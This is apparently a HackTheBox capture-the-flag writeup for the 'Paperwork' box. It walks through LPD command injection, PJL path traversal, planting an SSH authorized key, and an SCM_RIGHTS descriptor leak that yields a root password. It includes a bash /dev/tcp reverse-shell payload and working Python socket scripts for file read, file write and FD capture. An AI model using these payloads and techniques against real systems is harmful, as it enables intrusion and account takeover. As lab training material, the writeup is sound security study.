# Paperwork – HackTheBox Writeup

**Target:** Paperwork (10.129.52.191)
**Attacker:** Kali Linux
**OS:** Linux (Ubuntu 25.10 "Questing Quokka")
**Difficulty:** Easy
**Attack Path:** LPD Command Injection → Internal Service Discovery → PJL Path Traversal → SSH Key Write → SCM_RIGHTS File Descriptor Leak → Root

---

## Recon

### Port Scan

```bash
nmap -sV -sC -p- --min-rate 5000 10.129.52.191
```

Three ports open. SSH on 22, nginx on 80 redirecting to `paperwork.htb`, and a custom service on 1515 that nmap couldn't identify. The fingerprint came back with `Archive_Printer is ready and printing.` which matched the code I found later. Already had `paperwork.htb` in /etc/hosts.

### The Website

The site on port 80 is a corporate looking page. The interesting part was a ZIP file available for download. Inside it was a Python script called `server.py`, a custom LPD (Line Printer Daemon) print server. Reading through the code revealed the vulnerability immediately.

### Analyzing the LPD Server Code

The script implements a basic LPD server following RFC 1179. It accepts print jobs, parses the control file for a job name from the `J` line, and then does this:

```python
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

`job_name` comes directly from the client with zero sanitization and gets dropped into a shell command with `shell=True`. Textbook command injection.

Two other things worth noting in the code. The queue validation uses `if queue not in VALID_QUEUE` which is a substring check in Python. An empty string `""` is a substring of every string, so sending just the command byte `\x02` without a queue name bypasses the check entirely. And the `command` and `args` need to be handled carefully in the LPD protocol. The first byte of the connection determines the operation type: `\x02` means "receive a print job".

---

## Getting a Shell

### Command Injection via LPD

The service on port 1515 is the exact server from the ZIP. Wrote a Python exploit that speaks the LPD protocol and injects a reverse shell through the `J` line in the control file.

The payload breaks out of the `echo '...'` command: `'; bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' #`. The single quote closes the echo string, semicolon starts a new command, and `#` comments out the trailing `' >> /tmp/archive.log`.

The LPD protocol flow is: send `\x02` to start a print job, then a control file header with `\x02<size> cfA001kali\n`, then the control file content containing the `J` line with the payload. The server acks each step with `\x00`.

```bash
# Listener on Kali
nc -lvnp 4444

# Exploit
python3 lpd_exploit.py 10.129.52.191 10.10.14.235 4444
```

Shell popped as `lp`, the classic Linux printer user.

---

## Enumeration as lp

### No sudo, Limited Tools

```bash
id
# uid=7(lp) gid=7(lp) groups=7(lp)
```

No sudo installed on the box at all. Not just "user can't run sudo" but the binary literally doesn't exist. That rules out the fastest escalation path. No `nc` either, and `apt install` needs root. Working with a bare bones environment.

### The Apport Crash Dump (Dead End)

Found `/var/crash/_opt_LPDServer_server.py.7.crash` owned by `lp`. Apport is Ubuntu's crash reporter and these dumps can contain environment variables, stack traces, and sometimes full core dumps with process memory.

Spent significant time trying to extract a CoreDump from it. Tried `apport-unpack` (not installed), wrote a Python extractor, tried multiple approaches. Turned out the `CoreDump` field simply didn't exist in the dump. The crash was just a `PermissionError` from trying to bind port 515 (privileged port, needs root). The Traceback showed:

```
PermissionError: [Errno 13] Permission denied
```

At `LpdServer(port=515).run()`. The production server was meant to run on 515, the version we exploited runs on 1515. No credentials, no memory contents, pure dead end. But a good lesson: always check what fields actually exist in an Apport dump before spending time extracting them.

```bash
grep -aE "^[A-Za-z].*:" /var/crash/_opt_LPDServer_server.py.7.crash | cut -d: -f1
```

This lists all field names. If `CoreDump` isn't in the list, don't waste time trying to extract it.

### Discovering Internal Services

```bash
ss -tlnp
```

Two internal services jumped out. Port 9100 on localhost which is the standard JetDirect/AppSocket raw printing port, and port 1337 on localhost running some kind of web service.

```bash
ps aux | grep -iE "9100|1337|archiv"
```

Port 9100 belongs to `archivist` (uid 1000), running `/home/archivist/printer/jetdirect.py`. That's our lateral movement target. Port 1337 is a corporate intranet page running as root.

### The Intranet Page

```bash
curl -s http://127.0.0.1:1337/
```

A "Document Archiving Service" intake portal. Three critical pieces of information right on the page: the protocol is RFC 1179, the target queue is `archive_intake`, and there's a download link at `/download/archive` for the "Internal Processor" `paperwork-archive-v1.02`.

```bash
curl -s http://127.0.0.1:1337/download/archive -o /tmp/archive_proc
file /tmp/archive_proc
# Zip archive data
```

Unzipped it and found another `server.py`. Same vulnerable LPD code as before. But here's the thing: the process listing showed `jetdirect.py` not `server.py`, and it's on port 9100 which is a JetDirect port, not an LPD port. The download was misleading. The actual service speaks PJL (Printer Job Language), not LPD.

---

## Lateral Movement to archivist

### PJL Protocol Discovery

Tried sending LPD protocol data to port 9100. No response, no shell, nothing. The service simply ignored it because it doesn't speak LPD. Switched to PJL and immediately got results:

```bash
python3 -c "
import socket,time
s=socket.socket()
s.connect(('127.0.0.1',9100))
s.send(b'\x1b%-12345X@PJL FSDIRLIST NAME=\"0:/\" ENTRY=1 COUNT=65535\r\n\x1b%-12345X\r\n')
time.sleep(2)
s.settimeout(2)
print(s.recv(4096))
"
```

Got back a directory listing: `logs`, `jetdirect.py`. The `\x1b%-12345X` is the Universal Exit Language (UEL) escape sequence that switches printers into PJL mode. Standard PJL framing.

### Reading the Real Source Code

Used `@PJL FSUPLOAD` to read `jetdirect.py` directly from the running service:

```bash
python3 -c "
import socket,time
s=socket.socket()
s.connect(('127.0.0.1',9100))
s.send(b'\x1b%-12345X@PJL FSUPLOAD NAME=\"0:/jetdirect.py\" OFFSET=0 SIZE=6000\r\n')
time.sleep(2)
s.settimeout(3)
d=b''
while True:
 try: c=s.recv(4096)
 except: break
 if not c: break
 d+=c
print(d.decode(errors='ignore'))
"
```

The actual code is a proper PJL server implementing `FSDIRLIST`, `FSUPLOAD`, `FSDOWNLOAD`, `FSQUERY`, `INFO ID`, and `ECHO`. The critical vulnerability is in the `Filesystem._translate()` method:

```python
def _translate(self, path):
    clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
    return os.path.normpath(os.path.join(self._root, clean))
```

It does `os.path.normpath` which resolves `..` correctly, but never checks if the result is still inside `self._root`. Classic path traversal. And the `write()` method calls `os.makedirs(os.path.dirname(target), exist_ok=True)` before writing, so it can create directories too.

### Path Traversal Confirmation

```bash
python3 -c "
import socket,time
s=socket.socket()
s.connect(('127.0.0.1',9100))
s.send(b'\x1b%-12345X@PJL FSDIRLIST NAME=\"0:/..\" ENTRY=1 COUNT=65535\r\n\x1b%-12345X\r\n')
time.sleep(2)
s.settimeout(2)
print(s.recv(4096))
"
```

`0:/..` goes up from `/home/archivist/printer/` to `/home/archivist/`. Got the full listing back including `.ssh TYPE=DIR`. The `.ssh` directory already exists. Perfect for dropping an authorized key.

### SSH Key Write via PJL

Generated a key on Kali:

```bash
ssh-keygen -t ed25519 -f ~/.ssh/paperwork_key -N ""
cat ~/.ssh/paperwork_key.pub
```

Then on the box, used `@PJL FSDOWNLOAD` to write the public key through the path traversal:

```bash
python3 -c "
import socket,time
key = b'ssh-ed25519 AAAA...YOUR_KEY... kali@kali\n'
cmd = '@PJL FSDOWNLOAD NAME=\"0:/../.ssh/authorized_keys\" SIZE=' + str(len(key)) + '\r\n'
s = socket.socket()
s.connect(('127.0.0.1',9100))
s.send(b'\x1b%-12345X' + cmd.encode() + key)
time.sleep(2)
s.settimeout(2)
print(s.recv(4096))
"
```

Got `OK` back. The PJL server followed the path `0:/../.ssh/authorized_keys`, which resolved to `/home/archivist/.ssh/authorized_keys`, and wrote our public key. Since `jetdirect.py` runs as `archivist`, it has full write access to the home directory.

```bash
ssh -i ~/.ssh/paperwork_key archivist@paperwork.htb
cat ~/user.txt
```

User flag grabbed.

---

## Privilege Escalation

### Finding paperwork-daemon

No sudo on the box, no interesting SUID binaries, no capabilities, recent kernel (6.8.0-107-generic). Standard crontab with nothing custom. But the process listing showed something interesting:

```bash
ps aux | grep root
# root 1490 /usr/bin/python3 /usr/bin/paperwork-daemon
```

A custom Python daemon running as root.

### Analyzing the Daemon

```bash
cat /usr/bin/paperwork-daemon
```

The daemon does the following on startup:

1. Opens `/etc/paperwork/admin_pins.conf` as root and keeps the file descriptor (`admin_fd`) open for the lifetime of the process
2. Creates a Unix socket at `/run/paperwork/mgmt.sock` with permissions `0o660` owned by `root:1000` (archivist's GID)

When a client connects, it runs `scan_for_malice()` which reads `commands.log` (the JetDirect log file in archivist's printer directory) and checks for trigger words: `FSQUERY`, `FSUPLOAD`, or `FSDOWNLOAD`.

If triggers are found, `trigger_lockdown()` does something incredible: it sends both the log file descriptor AND the `admin_fd` (the open handle to the root-owned config file) to the client using `SCM_RIGHTS`:

```python
evidence_bundle = array.array("i", [log_fd, admin_fd])
conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])
```

`SCM_RIGHTS` is a Unix socket mechanism for passing open file descriptors between processes. The daemon opened the config file as root, so the file descriptor carries root's read access. When we receive it, we can read the file even though `archivist` has no direct access to it. The access control check happened when the file was opened, not when it's read through the passed descriptor.

### Triggering the Exploit

The `commands.log` already contained our PJL commands from the lateral movement phase:

```bash
grep -iE "FSQUERY|FSUPLOAD|FSDOWNLOAD" /home/archivist/printer/logs/commands.log
# Command: @PJL FSUPLOAD NAME="0:/jetdirect.py" OFFSET=0 SIZE=6000
# Command: @PJL FSDOWNLOAD NAME="0:/../.ssh/authorized_keys" SIZE=91
```

`scan_for_malice()` will return `True`. The socket is writable by archivist:

```bash
ls -la /run/paperwork/mgmt.sock
# srw-rw---- 1 root archivist 0 Jul 13 15:48 /run/paperwork/mgmt.sock
```

Connected and received the leaked file descriptors:

```bash
python3 -c "
import socket, array, os

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect('/run/paperwork/mgmt.sock')

msg, ancdata, flags, addr = s.recvmsg(4096, socket.CMSG_SPACE(8))
print('Message:', msg.decode())

for level, typ, data in ancdata:
    if level == socket.SOL_SOCKET and typ == socket.SCM_RIGHTS:
        fds = array.array('i')
        fds.frombytes(data)
        print('Received FDs:', list(fds))
        for fd in fds:
            try:
                content = os.pread(fd, 4096, 0)
                print(f'FD {fd} content:', content.decode())
            except Exception as e:
                print(f'FD {fd} error:', e)

s.close()
"
```

```
Message: ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.
Received FDs: [4, 5]
FD 4 content:
FD 5 content: ADMIN_PASSWORD=ApparelMortuaryCedar22
```

FD 5 is the `admin_fd` carrying the root password.

### Root

```bash
su
# Password: ApparelMortuaryCedar22
cat /root/root.txt
```

Box pwned.

---

## Attack Chain Summary

```
nmap -p- → Port 1515 (custom LPD), 80 (nginx)
→ ZIP download on website → server.py source code
→ Command Injection via J-line in subprocess.Popen(shell=True)
→ Reverse shell as lp
→ /var/crash/ Apport dump → dead end (no CoreDump, just PermissionError)
→ ss -tlnp → Port 9100 (archivist's jetdirect.py) + Port 1337 (Intranet)
→ Intranet → queue name "archive_intake" + processor download
→ PJL FSDIRLIST on 9100 → directory listing confirmed PJL protocol
→ PJL FSUPLOAD → read jetdirect.py source, found path traversal in _translate()
→ PJL FSDIRLIST 0:/.. → listed /home/archivist/, found .ssh directory
→ PJL FSDOWNLOAD 0:/../.ssh/authorized_keys → wrote SSH public key
→ SSH as archivist → user.txt
→ paperwork-daemon (root) → holds open FD to admin_pins.conf
→ commands.log already contained FSUPLOAD/FSDOWNLOAD triggers
→ Connected to /run/paperwork/mgmt.sock → triggered lockdown path
→ SCM_RIGHTS leaked admin_fd → read ADMIN_PASSWORD=ApparelMortuaryCedar22
→ su root → root.txt
```

---

## What I Learned

Don't assume internal services speak the same protocol just because the source code looks similar. The downloaded `server.py` was LPD but the actual `jetdirect.py` on port 9100 spoke PJL. The port number was the giveaway: 9100 is the standard JetDirect/AppSocket port, not an LPD port. When the LPD exploit produced no callback, switching to PJL worked immediately.

PJL filesystem commands are powerful. `@PJL FSDIRLIST` lists directories, `FSUPLOAD` reads files, `FSDOWNLOAD` writes files. If a print server supports PJL and has a path traversal, you effectively have arbitrary file read and write as whatever user runs the service. The `\x1b%-12345X` UEL prefix switches the printer into PJL mode.

Path traversal in `os.path.normpath` combined with `os.path.join` is a common Python pattern. `normpath` resolves `..` but doesn't enforce any boundary. The fix is to check that the resolved path starts with the intended root directory after normalization. This is the same concept as the `download_private_file` traversal in Camaleon CMS from the Facts box, just in a different language and protocol.

Writing SSH authorized_keys is cleaner than reverse shells for lateral movement. Once you have arbitrary file write as a user, dropping a public key gives you a stable, interactive SSH session. No TTY upgrade hassle, no shell dying randomly, proper tab completion. Always prefer this over reverse shells when possible.

`SCM_RIGHTS` is a real Linux privilege escalation vector. When a privileged process passes a file descriptor over a Unix socket, the recipient inherits the access rights from when the file was originally opened. The kernel doesn't re-check permissions on `read()` through a passed FD. This is by design, it's how things like systemd socket activation work, but when a root daemon passes FDs for sensitive files to unprivileged users, it's game over.

Apport crash dumps are worth checking but don't always have a CoreDump. The field list varies based on the crash type and system configuration (`ulimit -c`). Always list the fields first with `grep -aE "^[A-Za-z].*:" file.crash | cut -d: -f1` before trying to extract anything. The `Traceback` field for Python crashes can contain variable values from the crash context, which sometimes includes credentials that were in memory.

`ss -tlnp` only shows process info for services you own. For services owned by other users, you see the port but no PID. Cross-reference with `ps aux` to figure out who owns what. Internal services on localhost are almost always the lateral movement or privilege escalation path.

When a box has no `sudo`, no interesting SUID binaries, and a recent kernel, look for custom daemons running as root. `ps aux | grep root` filtered for non-kernel processes shows you what's custom. Custom code written for a CTF box is there to be exploited.

*Educational purposes only. This is a HackTheBox machine in a controlled lab environment.*
